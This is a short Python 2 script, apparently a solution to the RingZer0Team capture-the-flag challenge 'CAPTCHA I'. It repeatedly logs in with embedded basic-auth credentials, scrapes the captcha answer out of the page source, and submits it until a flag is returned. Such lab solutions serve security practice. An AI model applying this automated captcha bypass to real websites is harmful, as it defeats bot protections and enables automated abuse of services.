#!/usr/bin/python2
# -*- coding: utf-8 -*-
#My Solution for RingZer0Team CTF "CAPTCHA I"
#################################################
#						#
#						#
#		Cihad TAN			#
#		tanovich			#
#						#
#						#
#################################################
import BeautifulSoup, re
from requests import Session
from requests.auth import HTTPBasicAuth

url = "http://captcha.ringzer0team.com:7421/"
myCookies = { "PHPSESSID": "Your Cookie Here!" }
s = Session()

for _ in xrange(1001):
	response = s.get(url + "form1.php", auth=HTTPBasicAuth('captcha', 'QJc9U6wxD4SFT0u'), cookies=myCookies).text
	s.get(url + "captcha/captchabroken.php?new", auth=HTTPBasicAuth('captcha', 'QJc9U6wxD4SFT0u'), cookies=myCookies).text

	val = str(re.findall('==(.*)\)',response)[0].split('"')[1])

	response = s.post(url + "captcha2.php", {"captcha": val}, auth=HTTPBasicAuth('captcha', 'QJc9U6wxD4SFT0u'), allow_redirects=True, cookies=myCookies).text
	out = BeautifulSoup.BeautifulSoup( response ).find('div', {'class' :'alert alert-success'}).text
	print out
	if "flag" in out:
		break
